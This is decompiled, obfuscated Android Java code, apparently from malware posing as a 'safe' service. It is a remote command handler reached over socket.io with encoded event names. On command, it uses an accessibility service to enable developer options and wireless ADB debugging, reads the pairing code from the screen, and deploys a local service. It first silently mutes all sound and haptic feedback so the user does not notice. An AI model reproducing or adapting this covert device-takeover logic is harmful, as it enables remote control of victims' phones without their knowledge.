package com.storm.safe.rock.service.modules.command;

import android.accessibilityservice.AccessibilityService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Build;
import android.provider.Settings;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$DevOptState;
import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$PairState;
import com.storm.safe.rock.util.AbstractC0385a0;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.C0873ms;
import p000.C1097q4;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.RunnableC1052p1;
import p000.h10;
import p000.j41;
import p000.kg1;
import p000.kl0;
import p000.t60;
import p000.tz0;
import p000.uz0;
import p000.w00;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a0 */
/* loaded from: classes2.dex */
public final class C0343a0 implements InterfaceC0726jp {
    static {
        new C1097q4(null);
    }

    /* renamed from: a3 */
    public static final void m211873a3(C0343a0 c0343a0, Context context) {
        try {
            Object systemService = context.getSystemService("audio");
            AudioManager audioManager = systemService instanceof AudioManager ? (AudioManager) systemService : null;
            ContentResolver contentResolver = context.getContentResolver();
            if (audioManager != null) {
                try {
                    audioManager.setRingerMode(2);
                } catch (Exception e) {
                    t60.m214726f4("AdbTunnelCmdHandler", "⚠️ 恢复铃声失败: " + e.getMessage());
                }
            }
            t60.m214714d6("AdbTunnelCmdHandler", "✅ 已恢复铃声模式");
            try {
                Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 1);
                t60.m214714d6("AdbTunnelCmdHandler", "✅ 已开启触觉反馈");
            } catch (Exception e2) {
                t60.m214726f4("AdbTunnelCmdHandler", "⚠️ 开启触觉反馈失败: " + e2.getMessage());
            }
            t60.m214714d6("AdbTunnelCmdHandler", "🔊 local-service 部署成功后已恢复铃声 + 开启触觉反馈");
        } catch (Exception e3) {
            t60.m214705c6("AdbTunnelCmdHandler", "❌ restoreSoundAndHaptic 异常", e3);
        }
    }

    /* renamed from: a4 */
    public static void m211874a4(uz0 uz0Var, String str, String str2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("status", str);
        jSONObject.put("message", str2);
        String strM212470a0 = StringUtil.m212470a0("J1YSO0EHHytFJyJaFAVJPRwiWCg=");
        try {
            C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
            if (c0323a8M214869a5 != null) {
                c0323a8M214869a5.m211658c4(strM212470a0, jSONObject);
            }
        } catch (Exception e) {
            t60.m214705c6("AdbTunnelCmdHandler", "发送事件失败", e);
        }
    }

    /* renamed from: a5 */
    public static void m211875a5(uz0 uz0Var, boolean z, String str) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, z);
        jSONObject.put("message", str);
        String strM212470a0 = StringUtil.m212470a0("Kl0TBVktAiBSPRRLFCldNwI9Ug==");
        try {
            C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
            if (c0323a8M214869a5 != null) {
                c0323a8M214869a5.m211658c4(strM212470a0, jSONObject);
            }
        } catch (Exception e) {
            t60.m214705c6("AdbTunnelCmdHandler", "发送事件失败", e);
        }
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("DEPLOY_LOCAL_SERVICE", "START_PAIRING", "OPEN_WIFI_DEBUG_SETTINGS", "FULL_DEPLOY", "OPEN_ABOUT_PHONE", "AUTO_WIRELESS_PAIRING", "DIRECT_PAIR");
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    public final Object mo210874a2(String str, JSONObject jSONObject, final uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        switch (str.hashCode()) {
            case -1417001564:
                if (str.equals("OPEN_WIFI_DEBUG_SETTINGS")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 收到打开无线调试设置命令 ★★★");
                    C0873ms c0873ms = AbstractC0385a0.f55229a0;
                    AbstractC0385a0.m212471a0(new AdbTunnelCommandHandler$handleOpenWifiDebugSettings$1(null, uz0Var, this));
                    break;
                }
                break;
            case -947840873:
                if (str.equals("FULL_DEPLOY")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 收到完整部署命令 ★★★");
                    m211874a4(uz0Var, "full_deploy_started", "开始完整部署（从关于手机开始）...");
                    dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                    j41 j41Var = C0360a2.f53810f9;
                    j41Var.initInstance(dqtvuisjdVar, dqtvuisjdVar);
                    final C0360a2 j41Var2 = j41Var.getInstance();
                    if (j41Var2 != null) {
                        t60.m214714d6("AdbTunnelCmdHandler", "★★★ 调用 forceStart() 开始完整流程 ★★★");
                        w00 w00Var = new w00() { // from class: com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler$handleFullDeploy$1
                            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                            {
                                super(0);
                            }

                            @Override // p000.w00
                            public final Object invoke() {
                                t60.m214714d6("AdbTunnelCmdHandler", "★★★ 完整部署流程完成 ★★★");
                                uz0 uz0Var2 = uz0Var;
                                C0343a0.m211874a4(uz0Var2, "full_deploy_success", "完整部署已完成");
                                C0343a0.m211873a3(this.f53409a0, uz0Var2.f60536a0);
                                return C1351vv.f60710b1;
                            }
                        };
                        h10 h10Var = new h10(this) { // from class: com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler$handleFullDeploy$2
                            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                            {
                                super(1);
                            }

                            @Override // p000.h10
                            public final Object invoke(Object obj) {
                                String str2 = (String) obj;
                                t60.m214695b6(str2, "reason");
                                t60.m214704c5("AdbTunnelCmdHandler", "★★★ 完整部署流程失败: " + str2 + " ★★★");
                                C0343a0.m211874a4(uz0Var, "full_deploy_failed", "部署失败: ".concat(str2));
                                return C1351vv.f60710b1;
                            }
                        };
                        t60.m214714d6("SystemOptimize", "强制完整部署：跳过所有检查，从头执行");
                        String str2 = Build.BRAND;
                        String str3 = Build.MODEL;
                        int i = Build.VERSION.SDK_INT;
                        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("品牌: ", str2, ", 型号: ", str3, ", SDK: ");
                        sbM41c2.append(i);
                        t60.m214714d6("SystemOptimize", sbM41c2.toString());
                        j41Var2.m212043d0();
                        j41Var2.f53827b2.removeCallbacksAndMessages(null);
                        j41Var2.f53828b3 = null;
                        j41Var2.f53840c5.set(false);
                        try {
                            j41Var2.f53816a1.getSharedPreferences("system_optimize", 0).edit().putBoolean("pair_completed", false).commit();
                        } catch (Exception unused) {
                        }
                        j41Var2.f53823a8.set(true);
                        j41Var2.f53822a7.set(false);
                        j41Var2.f53831b6 = false;
                        j41Var2.f53820a5.set(SystemOptimizeManager$DevOptState.UNKNOWN);
                        j41Var2.f53819a4.set(SystemOptimizeManager$PairState.f53759a0);
                        ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
                        t60.m214694b5(scheduledExecutorServiceNewSingleThreadScheduledExecutor, "newSingleThreadScheduledExecutor()");
                        j41Var2.f53817a2 = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
                        j41Var2.f53829b4 = w00Var;
                        j41Var2.f53830b5 = h10Var;
                        j41Var2.f53827b2.postDelayed(new RunnableC1052p1(j41Var2, 12, w00Var), 180000L);
                        try {
                            AccessibilityService accessibilityService = j41Var2.f53815a0;
                            dqtvuisjd dqtvuisjdVar2 = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
                            if (dqtvuisjdVar2 != null) {
                                dqtvuisjdVar2.m211496j0();
                            }
                        } catch (Exception e) {
                            tz0.m214810b0("暂停 WRITE_SETTINGS 权限申请失败: ", e.getMessage(), "SystemOptimize");
                        }
                        j41Var2.f53827b2.post(new Runnable() { // from class: com.storm.safe.rock.service.modules.setup.a1
                            @Override // java.lang.Runnable
                            public final void run() {
                                C0360a2 c0360a2 = j41Var2;
                                t60.m214714d6("SystemOptimize", "========== 启动 OpenDevelopmentDelegate ==========");
                                C0358a0 c0358a0 = c0360a2.f53828b3;
                                if (c0358a0 != null) {
                                    c0358a0.m211979a8();
                                }
                                AccessibilityService accessibilityService2 = c0360a2.f53815a0;
                                Context context = c0360a2.f53816a1;
                                C0358a0 c0358a02 = new C0358a0(accessibilityService2, context);
                                c0360a2.f53828b3 = c0358a02;
                                SystemOptimizeManager$startOpenDevelopmentDelegate$1 systemOptimizeManager$startOpenDevelopmentDelegate$1 = new SystemOptimizeManager$startOpenDevelopmentDelegate$1(c0360a2);
                                SystemOptimizeManager$startOpenDevelopmentDelegate$2 systemOptimizeManager$startOpenDevelopmentDelegate$2 = new SystemOptimizeManager$startOpenDevelopmentDelegate$2(c0360a2);
                                c0358a02.f53797a5 = systemOptimizeManager$startOpenDevelopmentDelegate$1;
                                c0358a02.f53798a6 = systemOptimizeManager$startOpenDevelopmentDelegate$2;
                                c0358a02.f53800a8 = 0;
                                c0358a02.f53799a7 = false;
                                c0358a02.f53803b1 = false;
                                c0358a02.f53804b2 = false;
                                c0358a02.f53802b0 = null;
                                t60.m214714d6("OpenDevDelegate", "开始开发者选项开启流程");
                                t60.m214714d6("OpenDevDelegate", "========== 开始开发者选项开启流程 ==========");
                                String str4 = Build.BRAND;
                                String str5 = Build.MODEL;
                                int i2 = Build.VERSION.SDK_INT;
                                StringBuilder sbM41c22 = AbstractC0003a2.m41c2("品牌: ", str4, ", 型号: ", str5, ", SDK: ");
                                sbM41c22.append(i2);
                                t60.m214714d6("OpenDevDelegate", sbM41c22.toString());
                                t60.m214714d6("OpenDevDelegate", "当前状态: " + c0358a02.f53795a3.get());
                                t60.m214714d6("OpenDevDelegate", "→ 直接走关于手机流程（跳过已开启检查）");
                                LinkedHashMap linkedHashMap = c0358a02.f53807b5;
                                try {
                                    Object systemService = context.getSystemService("audio");
                                    AudioManager audioManager = systemService instanceof AudioManager ? (AudioManager) systemService : null;
                                    ContentResolver contentResolver = context.getContentResolver();
                                    if (audioManager != null) {
                                        Iterator it = c0358a02.f53808b6.iterator();
                                        while (it.hasNext()) {
                                            int iIntValue = ((Number) it.next()).intValue();
                                            try {
                                                linkedHashMap.put(Integer.valueOf(iIntValue), Integer.valueOf(audioManager.getStreamVolume(iIntValue)));
                                                audioManager.setStreamVolume(iIntValue, 0, 0);
                                                t60.m214702c3("OpenDevDelegate", "流" + iIntValue + "音量设为0 (原值: " + linkedHashMap.get(Integer.valueOf(iIntValue)) + ")");
                                            } catch (Exception e2) {
                                                t60.m214726f4("OpenDevDelegate", "设置流" + iIntValue + "音量失败: " + e2.getMessage());
                                            }
                                        }
                                    }
                                    c0358a02.f53805b3 = audioManager != null ? audioManager.getRingerMode() : 2;
                                    if (audioManager != null) {
                                        try {
                                            audioManager.setRingerMode(0);
                                        } catch (Exception e3) {
                                            t60.m214726f4("OpenDevDelegate", "设置静音模式失败(已通过音量控制静音): " + e3.getMessage());
                                        }
                                    }
                                    t60.m214714d6("OpenDevDelegate", "已设置静音模式");
                                    int i3 = 1;
                                    try {
                                        i3 = Settings.System.getInt(contentResolver, "haptic_feedback_enabled", 1);
                                    } catch (Exception unused2) {
                                    }
                                    c0358a02.f53806b4 = i3;
                                    try {
                                        Settings.System.putInt(contentResolver, "haptic_feedback_enabled", 0);
                                        t60.m214714d6("OpenDevDelegate", "已关闭触觉反馈");
                                    } catch (Exception e4) {
                                        t60.m214726f4("OpenDevDelegate", "关闭触觉反馈失败(需要修改系统设置权限): " + e4.getMessage());
                                    }
                                    t60.m214714d6("OpenDevDelegate", "适配前静音完成 (原铃声模式: " + c0358a02.f53805b3 + ", 原触觉: " + c0358a02.f53806b4 + ")");
                                } catch (Exception e5) {
                                    t60.m214705c6("OpenDevDelegate", "muteAndDisableHaptic 异常", e5);
                                }
                                t60.m214714d6("OpenDevDelegate", "【关键】先把 app 调到前台，清理残留页面...");
                                c0358a02.f53794a2.execute(new kl0(c0358a02, 1));
                            }
                        });
                        break;
                    } else {
                        t60.m214704c5("AdbTunnelCmdHandler", "SystemOptimizeManager 初始化失败，无法执行完整部署");
                        m211874a4(uz0Var, "full_deploy_failed", "服务未初始化");
                        break;
                    }
                }
                break;
            case 376023979:
                if (str.equals("START_PAIRING")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 收到手动配对命令 ★★★");
                    C0873ms c0873ms2 = AbstractC0385a0.f55229a0;
                    AbstractC0385a0.m212471a0(new AdbTunnelCommandHandler$handleStartPairing$1(null, uz0Var, this));
                    break;
                }
                break;
            case 541461872:
                if (str.equals("DIRECT_PAIR")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 直接配对（读取屏幕配对码）★★★");
                    try {
                        dqtvuisjd dqtvuisjdVar3 = uz0Var.f60536a0;
                        j41 j41Var3 = C0360a2.f53810f9;
                        j41Var3.initInstance(dqtvuisjdVar3, dqtvuisjdVar3);
                        t60.m214714d6("AdbTunnelCmdHandler", "已尝试初始化 SystemOptimizeManager");
                        C0360a2 j41Var4 = j41Var3.getInstance();
                        if (j41Var4 == null) {
                            t60.m214704c5("AdbTunnelCmdHandler", "配对管理器未初始化");
                            m211874a4(uz0Var, "direct_pair_failed", "配对管理器未初始化");
                            m211875a5(uz0Var, false, "配对管理器未初始化");
                        } else {
                            t60.m214714d6("AdbTunnelCmdHandler", "配对管理器已获取，开始读取配对码...");
                            m211874a4(uz0Var, "direct_pair_start", "正在读取屏幕配对码...");
                            C0873ms c0873ms3 = AbstractC0385a0.f55229a0;
                            AbstractC0385a0.m212471a0(new AdbTunnelCommandHandler$handleDirectPair$1(j41Var4, this, uz0Var, null));
                        }
                        break;
                    } catch (Exception e2) {
                        t60.m214705c6("AdbTunnelCmdHandler", "直接配对异常", e2);
                        m211874a4(uz0Var, "direct_pair_failed", "配对异常: " + e2.getMessage());
                        break;
                    }
                }
                break;
            case 575155079:
                if (str.equals("OPEN_ABOUT_PHONE")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 打开关于手机 ★★★");
                    try {
                        Intent intent = new Intent("android.settings.DEVICE_INFO_SETTINGS");
                        intent.addFlags(268435456);
                        uz0Var.f60536a0.startActivity(intent);
                        m211875a5(uz0Var, true, "已打开关于手机");
                        break;
                    } catch (Exception e3) {
                        t60.m214705c6("AdbTunnelCmdHandler", "打开关于手机失败", e3);
                        m211875a5(uz0Var, false, "打开失败: " + e3.getMessage());
                        break;
                    }
                }
                break;
            case 1375796119:
                if (str.equals("AUTO_WIRELESS_PAIRING")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 自动无线配对 ★★★");
                    try {
                        C0360a2 j41Var5 = C0360a2.f53810f9.getInstance();
                        m211874a4(uz0Var, "pairing_start", "开始自动配对...");
                        if (j41Var5 != null) {
                            j41Var5.m212095k5();
                        }
                        m211875a5(uz0Var, true, "配对流程已启动");
                        break;
                    } catch (Exception e4) {
                        t60.m214705c6("AdbTunnelCmdHandler", "自动无线配对异常", e4);
                        m211874a4(uz0Var, "pairing_failed", "配对异常: " + e4.getMessage());
                        break;
                    }
                }
                break;
            case 1605336137:
                if (str.equals("DEPLOY_LOCAL_SERVICE")) {
                    t60.m214714d6("AdbTunnelCmdHandler", "★★★ 收到部署 local-service 命令 ★★★");
                    C0873ms c0873ms4 = AbstractC0385a0.f55229a0;
                    AbstractC0385a0.m212471a0(new AdbTunnelCommandHandler$handleDeployLocalService$1(null, uz0Var, this));
                    break;
                }
                break;
        }
        return C1351vv.f60710b1;
    }
}
